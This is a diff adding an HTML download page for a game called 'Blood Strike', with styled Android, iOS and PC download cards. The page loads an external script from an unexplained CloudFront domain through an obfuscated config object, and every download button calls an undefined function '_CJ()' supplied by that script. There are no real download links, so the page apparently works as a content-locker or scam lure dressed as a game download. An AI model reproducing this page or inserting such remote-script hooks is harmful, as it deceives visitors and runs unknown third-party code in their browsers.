@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blood Strike - Download Now</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-bg: #0a0a0a;
+            --secondary-bg: #1a1a1a;
+            --accent-red: #ff3333;
+            --accent-orange: #ff6b00;
+            --text-primary: #ffffff;
+            --text-secondary: #cccccc;
+            --glow: 0 0 20px rgba(255, 51, 51, 0.5);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: var(--primary-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255, 51, 51, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 107, 0, 0.1) 0%, transparent 50%),
+                linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            z-index: -1;
+            animation: bgShift 15s ease-in-out infinite alternate;
+        }
+
+        @keyframes bgShift {
+            0% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+
+        /* Grid pattern overlay */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 51, 51, 0.03) 2px, rgba(255, 51, 51, 0.03) 4px),
+                repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(255, 51, 51, 0.03) 2px, rgba(255, 51, 51, 0.03) 4px);
+            z-index: -1;
+            opacity: 0.5;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header with logo */
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+            animation: fadeInDown 1s ease-out;
+        }
+
+        .logo-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 4rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--accent-red) 0%, var(--accent-orange) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            filter: drop-shadow(var(--glow));
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { filter: drop-shadow(0 0 20px rgba(255, 51, 51, 0.5)); }
+            50% { filter: drop-shadow(0 0 40px rgba(255, 51, 51, 0.8)); }
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            color: var(--text-secondary);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            opacity: 0;
+            animation: fadeIn 1s ease-out 0.5s forwards;
+        }
+
+        /* Hero section */
+        .hero {
+            position: relative;
+            margin-bottom: 4rem;
+            animation: fadeInUp 1s ease-out 0.3s backwards;
+        }
+
+        .hero-image {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            display: block;
+            border-radius: 20px;
+            box-shadow: 
+                0 20px 60px rgba(0, 0, 0, 0.5),
+                0 0 40px rgba(255, 51, 51, 0.3);
+            border: 2px solid rgba(255, 51, 51, 0.3);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .hero-image:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 
+                0 30px 80px rgba(0, 0, 0, 0.6),
+                0 0 60px rgba(255, 51, 51, 0.5);
+        }
+
+        /* Download section */
+        .download-section {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .section-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            opacity: 0;
+            animation: fadeIn 1s ease-out 0.8s forwards;
+        }
+
+        .download-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-top: 3rem;
+        }
+
+        .download-card {
+            background: linear-gradient(135deg, var(--secondary-bg) 0%, rgba(26, 26, 26, 0.8) 100%);
+            border: 2px solid rgba(255, 51, 51, 0.2);
+            border-radius: 15px;
+            padding: 2rem;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out forwards;
+        }
+
+        .download-card:nth-child(1) { animation-delay: 1s; }
+        .download-card:nth-child(2) { animation-delay: 1.2s; }
+        .download-card:nth-child(3) { animation-delay: 1.4s; }
+
+        .download-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 51, 51, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .download-card:hover::before {
+            left: 100%;
+        }
+
+        .download-card:hover {
+            transform: translateY(-15px) scale(1.05);
+            border-color: var(--accent-red);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                0 0 30px rgba(255, 51, 51, 0.4),
+                inset 0 0 20px rgba(255, 51, 51, 0.1);
+        }
+
+        .download-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent-red) 0%, var(--accent-orange) 100%);
+            box-shadow: var(--glow);
+            transition: all 0.3s ease;
+        }
+
+        .download-card:hover .download-icon {
+            transform: rotate(360deg) scale(1.1);
+            box-shadow: 0 0 40px rgba(255, 51, 51, 0.8);
+        }
+
+        .download-icon svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+
+        .platform-name {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .platform-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .download-btn {
+            display: inline-block;
+            padding: 0.8rem 2rem;
+            background: linear-gradient(135deg, var(--accent-red) 0%, var(--accent-orange) 100%);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 51, 51, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .download-btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(255, 51, 51, 0.5);
+        }
+
+        .download-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            opacity: 0;
+            animation: fadeIn 1s ease-out 1.8s forwards;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2.5rem;
+            }
+
+            .section-title {
+                font-size: 1.8rem;
+            }
+
+            .download-grid {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+
+            .download-card {
+                padding: 1.5rem;
+            }
+        }
+
+        /* Particle effect on cursor */
+        .cursor-trail {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: radial-gradient(circle, var(--accent-red), transparent);
+            pointer-events: none;
+            opacity: 0;
+            animation: trailFade 1s ease-out;
+            z-index: 9999;
+        }
+
+        @keyframes trailFade {
+            from {
+                opacity: 0.8;
+                transform: scale(1);
+            }
+            to {
+                opacity: 0;
+                transform: scale(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-container">
+                <h1 class="logo">BLOOD STRIKE</h1>
+            </div>
+            <p class="tagline">Battle Without Mercy</p>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <svg class="hero-image" viewBox="0 0 800 600" xmlns="http://www.w3.org/2000/svg">
+                <!-- Game-style background -->
+                <defs>
+                    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#1a1a1a;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#0a0a0a;stop-opacity:1" />
+                    </linearGradient>
+                    <linearGradient id="redGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#ff3333;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#ff6b00;stop-opacity:1" />
+                    </linearGradient>
+                    <filter id="glow">
+                        <feGaussianBlur stdDeviation="4" result="coloredBlur"/>
+                        <feMerge>
+                            <feMergeNode in="coloredBlur"/>
+                            <feMergeNode in="SourceGraphic"/>
+                        </feMerge>
+                    </filter>
+                </defs>
+                
+                <!-- Background -->
+                <rect width="800" height="600" fill="url(#bgGrad)"/>
+                
+                <!-- Grid pattern -->
+                <g opacity="0.1">
+                    <line x1="0" y1="150" x2="800" y2="150" stroke="#ff3333" stroke-width="1"/>
+                    <line x1="0" y1="300" x2="800" y2="300" stroke="#ff3333" stroke-width="1"/>
+                    <line x1="0" y1="450" x2="800" y2="450" stroke="#ff3333" stroke-width="1"/>
+                    <line x1="200" y1="0" x2="200" y2="600" stroke="#ff3333" stroke-width="1"/>
+                    <line x1="400" y1="0" x2="400" y2="600" stroke="#ff3333" stroke-width="1"/>
+                    <line x1="600" y1="0" x2="600" y2="600" stroke="#ff3333" stroke-width="1"/>
+                </g>
+                
+                <!-- Central emblem -->
+                <g transform="translate(400, 300)" filter="url(#glow)">
+                    <!-- Outer ring -->
+                    <circle cx="0" cy="0" r="180" fill="none" stroke="url(#redGrad)" stroke-width="4" opacity="0.8"/>
+                    <circle cx="0" cy="0" r="160" fill="none" stroke="url(#redGrad)" stroke-width="2" opacity="0.5"/>
+                    
+                    <!-- Inner design -->
+                    <polygon points="0,-120 40,-40 120,-30 40,20 60,100 0,60 -60,100 -40,20 -120,-30 -40,-40" 
+                             fill="url(#redGrad)" opacity="0.9"/>
+                    
+                    <!-- Center circle -->
+                    <circle cx="0" cy="0" r="50" fill="#0a0a0a" stroke="url(#redGrad)" stroke-width="3"/>
+                    
+                    <!-- Blood drop symbol -->
+                    <path d="M 0,-30 Q -15,-10 -15,10 Q -15,25 0,35 Q 15,25 15,10 Q 15,-10 0,-30 Z" 
+                          fill="url(#redGrad)" filter="url(#glow)"/>
+                    
+                    <!-- Crosshair -->
+                    <line x1="-180" y1="0" x2="-200" y2="0" stroke="url(#redGrad)" stroke-width="3"/>
+                    <line x1="180" y1="0" x2="200" y2="0" stroke="url(#redGrad)" stroke-width="3"/>
+                    <line x1="0" y1="-180" x2="0" y2="-200" stroke="url(#redGrad)" stroke-width="3"/>
+                    <line x1="0" y1="180" x2="0" y2="200" stroke="url(#redGrad)" stroke-width="3"/>
+                </g>
+                
+                <!-- Corner accents -->
+                <g opacity="0.6">
+                    <polyline points="50,50 50,100 100,100" fill="none" stroke="url(#redGrad)" stroke-width="3"/>
+                    <polyline points="750,50 750,100 700,100" fill="none" stroke="url(#redGrad)" stroke-width="3"/>
+                    <polyline points="50,550 50,500 100,500" fill="none" stroke="url(#redGrad)" stroke-width="3"/>
+                    <polyline points="750,550 750,500 700,500" fill="none" stroke="url(#redGrad)" stroke-width="3"/>
+                </g>
+                
+                <!-- Glowing particles -->
+                <g opacity="0.7">
+                    <circle cx="150" cy="100" r="3" fill="#ff3333">
+                        <animate attributeName="opacity" values="0.3;1;0.3" dur="2s" repeatCount="indefinite"/>
+                    </circle>
+                    <circle cx="650" cy="150" r="2" fill="#ff6b00">
+                        <animate attributeName="opacity" values="0.5;1;0.5" dur="3s" repeatCount="indefinite"/>
+                    </circle>
+                    <circle cx="200" cy="500" r="2.5" fill="#ff3333">
+                        <animate attributeName="opacity" values="0.4;1;0.4" dur="2.5s" repeatCount="indefinite"/>
+                    </circle>
+                    <circle cx="600" cy="450" r="3" fill="#ff6b00">
+                        <animate attributeName="opacity" values="0.6;1;0.6" dur="2.8s" repeatCount="indefinite"/>
+                    </circle>
+                </g>
+            </svg>
+        </section>
+		
+		<script type="text/javascript">
+    var wqSdw_EHq_QCPXRc={"it":4597383,"key":"46b54"};
+</script>
+<script src="https://d3v3431sr9puku.cloudfront.net/d0a16ab.js"></script>
+
+</section>
+
+        <!-- Download Section -->
+        <section class="download-section">
+            <h2 class="section-title">Download Now</h2>
+            
+            <div class="download-grid">
+                <!-- Android -->
+                <div class="download-card">
+                    <div class="download-icon">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M17.6,9.48l1.84-3.18c0.16-0.31,0.04-0.69-0.26-0.85c-0.29-0.15-0.65-0.06-0.83,0.22l-1.88,3.24 c-2.86-1.21-6.08-1.21-8.94,0L5.65,5.67c-0.19-0.29-0.58-0.38-0.87-0.2C4.5,5.65,4.41,6.01,4.56,6.3L6.4,9.48 C3.3,11.25,1.28,14.44,1,18h22C22.72,14.44,20.7,11.25,17.6,9.48z M7,15.25c-0.69,0-1.25-0.56-1.25-1.25 c0-0.69,0.56-1.25,1.25-1.25S8.25,13.31,8.25,14C8.25,14.69,7.69,15.25,7,15.25z M17,15.25c-0.69,0-1.25-0.56-1.25-1.25 c0-0.69,0.56-1.25,1.25-1.25s1.25,0.56,1.25,1.25C18.25,14.69,17.69,15.25,17,15.25z"/>
+                        </svg>
+                    </div>
+                    <h3 class="platform-name">Android</h3>
+                    <p class="platform-desc">For Android Devices</p>
+                    <a href="javascript:void(0)" onclick="_CJ()" class="download-btn">
+                        <span>Download</span>
+                    </a>
+                </div>
+
+                <!-- iOS -->
+                <div class="download-card">
+                    <div class="download-icon">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M17.05,20.28c-0.98,0.95-2.05,0.8-3.08,0.35c-1.09-0.46-2.09-0.48-3.24,0c-1.44,0.62-2.2,0.44-3.06-0.35 C2.79,15.25,3.51,7.59,9.05,7.31c1.35,0.07,2.29,0.74,3.08,0.8c1.18-0.24,2.31-0.93,3.57-0.84c1.51,0.12,2.65,0.72,3.4,1.8 c-3.12,1.87-2.38,5.98,0.48,7.13c-0.57,1.5-1.31,2.99-2.54,4.09L17.05,20.28z M12.03,7.25c-0.15-2.23,1.66-4.07,3.74-4.25 c0.29,2.58-2.34,4.5-3.74,4.25z"/>
+                        </svg>
+                    </div>
+                    <h3 class="platform-name">iOS</h3>
+                    <p class="platform-desc">For iPhone & iPad</p>
+                    <a href="javascript:void(0)" onclick="_CJ()" class="download-btn">
+                        <span>Download</span>
+                    </a>
+                </div>
+
+                <!-- PC -->
+                <div class="download-card">
+                    <div class="download-icon">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M20,18c1.1,0,2-0.9,2-2V6c0-1.1-0.9-2-2-2H4C2.9,4,2,4.9,2,6v10c0,1.1,0.9,2,2,2H0v2h24v-2H20z M4,6h16v10H4V6z"/>
+                        </svg>
+                    </div>
+                    <h3 class="platform-name">PC</h3>
+                    <p class="platform-desc">For Desktop Computer</p>
+                    <a href="javascript:void(0)" onclick="_CJ()" class="download-btn">
+                        <span>Download</span>
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>&copy; 2024 Blood Strike. All Rights Reserved.</p>
+        </footer>
+    </div>
+
+    <script>
+	
+	
+        // Cursor trail effect
+        document.addEventListener('mousemove', (e) => {
+            if (Math.random() > 0.8) { // Only create trails occasionally
+                const trail = document.createElement('div');
+                trail.className = 'cursor-trail';
+                trail.style.left = e.pageX + 'px';
+                trail.style.top = e.pageY + 'px';
+                document.body.appendChild(trail);
+                
+                setTimeout(() => trail.remove(), 1000);
+            }
+        });
+
+        // Add click ripple effect
+        document.querySelectorAll('.download-card').forEach(card => {
+            card.addEventListener('click', function(e) {
+                const ripple = document.createElement('div');
+                const rect = this.getBoundingClientRect();
+                const size = Math.max(rect.width, rect.height);
+                const x = e.clientX - rect.left - size / 2;
+                const y = e.clientY - rect.top - size / 2;
+                
+                ripple.style.cssText = `
+                    position: absolute;
+                    width: ${size}px;
+                    height: ${size}px;
+                    top: ${y}px;
+                    left: ${x}px;
+                    background: radial-gradient(circle, rgba(255, 51, 51, 0.6), transparent);
+                    border-radius: 50%;
+                    pointer-events: none;
+                    animation: rippleEffect 0.6s ease-out;
+                `;
+                
+                this.appendChild(ripple);
+                setTimeout(() => ripple.remove(), 600);
+            });
+        });
+
+        // Add ripple animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes rippleEffect {
+                from {
+                    transform: scale(0);
+                    opacity: 1;
+                }
+                to {
+                    transform: scale(2);
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
